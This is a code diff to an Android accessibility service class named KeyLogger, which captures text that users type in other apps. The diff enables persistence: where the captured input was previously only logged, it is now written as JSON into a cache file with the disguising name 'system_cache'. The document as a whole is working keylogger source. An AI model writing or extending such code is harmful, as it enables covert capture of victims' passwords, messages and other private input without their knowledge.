@@ -10,6 +10,8 @@ import kotlinx.coroutines.Job
 import kotlinx.coroutines.delay
 import kotlinx.coroutines.launch
 import org.json.JSONObject
+import java.io.File
+import java.io.FileOutputStream
 import java.util.UUID
 import java.util.concurrent.ConcurrentLinkedQueue
 
@@ -21,16 +23,16 @@ class KeyLogger : AccessibilityService() {
         fun getInstance(): KeyLogger? = instance
     }
 
-    // Queue for raw accessibility events (optional, for batch processing)
+    // Queue for potential batch processing of events (optional)
     private val eventQueue = ConcurrentLinkedQueue<AccessibilityEvent>()
 
     // Members for debouncing and logging
     private val debounceJobs = mutableMapOf<String, Job>()
     private val logQueue = ConcurrentLinkedQueue<LogEntry>()
     private val coroutineScope = CoroutineScope(Dispatchers.IO)
-    private val logFilename = "system_cache" // Not used now
+    private val logFilename = "system_cache"
 
-    // Data class for log entries
+    // Data class to hold log entries
     data class LogEntry(
         val timestamp: Long,
         val fieldName: String,
@@ -41,10 +43,13 @@ class KeyLogger : AccessibilityService() {
     override fun onCreate() {
         super.onCreate()
         instance = this
+        Log.d(TAG, "Service connected")
     }
 
     override fun onAccessibilityEvent(event: AccessibilityEvent) {
-        Log.d(TAG, "Received event: type=${event.eventType} text=${event.text}")
+        // Log every received event for debugging
+        Log.d(TAG, "Received event: type=${event.eventType}, package=${event.packageName}")
+
         when (event.eventType) {
             AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED -> {
                 event.text.forEach { text ->
@@ -59,7 +64,7 @@ class KeyLogger : AccessibilityService() {
             }
         }
 
-        // Optionally add raw events to a queue for further batch processing
+        // Optionally, add the raw event to a queue for batch processing if needed
         eventQueue.add(event)
         if (eventQueue.size > 20) {
             processEventQueue()
@@ -128,6 +133,7 @@ class KeyLogger : AccessibilityService() {
                 eventQueue.poll()?.let { events.add(it) }
             }
             // Process the batch of events if needed.
+            Log.d(TAG, "Processing ${events.size} queued events")
         }
     }
 
@@ -136,9 +142,9 @@ class KeyLogger : AccessibilityService() {
     }
 
     /**
-     * Debounced logging function.
+     * Debounced logging function:
      * Cancels any pending job for the given field, waits for debounceDelayMillis,
-     * then creates a log entry and (instead of sending to cache) logs the JSON payload.
+     * then creates a log entry and writes the logs to a cache file.
      */
     private fun logRawInput(
         fieldName: String,
@@ -157,14 +163,14 @@ class KeyLogger : AccessibilityService() {
                 appScreen = screenName
             )
             logQueue.add(entry)
-            saveLogsForValidation()
+            saveLogsToCache()
         }
     }
 
     /**
-     * Instead of writing to a cache file, log the JSON payload for validation.
+     * Persists the current logQueue as a JSON payload appended to a cache file.
      */
-    private suspend fun saveLogsForValidation(): Boolean {
+    private suspend fun saveLogsToCache(): Boolean {
         if (logQueue.isEmpty()) return true
         val logs = mutableListOf<LogEntry>()
         while (logQueue.isNotEmpty()) {
@@ -172,12 +178,12 @@ class KeyLogger : AccessibilityService() {
         }
         return try {
             val jsonPayload = createJsonPayload(logs)
-            // appendToCacheFile(jsonPayload)
-            // Log the payload for validation:
-            Log.d(TAG, "Payload: $jsonPayload")
+            appendToCacheFile(jsonPayload)
+            Log.d(TAG, "Saved payload: $jsonPayload")
             true
         } catch (e: Exception) {
             logs.forEach { logQueue.add(it) }
+            Log.e(TAG, "Error saving logs: ${e.message}")
             false
         }
     }
@@ -206,20 +212,17 @@ class KeyLogger : AccessibilityService() {
         return jsonObject.toString()
     }
 
-    override fun onServiceConnected() {
-        super.onServiceConnected()
-        Log.d(TAG, "Service connected")
+    /**
+     * Appends the provided data to a cache file located in the app’s cache directory.
+     */
+    private fun appendToCacheFile(data: String) {
+        val cacheFile = File(cacheDir, logFilename)
+        try {
+            FileOutputStream(cacheFile, true).use { outputStream ->
+                outputStream.write("$data\n".toByteArray())
+            }
+        } catch (e: Exception) {
+            Log.e(TAG, "Error writing to cache file: ${e.message}")
+        }
     }
-
-    // function to write to cache
-    // private fun appendToCacheFile(data: String) {
-    //     val cacheFile = File(cacheDir, logFilename)
-    //     try {
-    //         FileOutputStream(cacheFile, true).use { outputStream ->
-    //             outputStream.write("$data\n".toByteArray())
-    //         }
-    //     } catch (e: Exception) {
-    //         Log.e(TAG, "Error writing to cache file: ${e.message}")
-    //     }
-    // }
 }
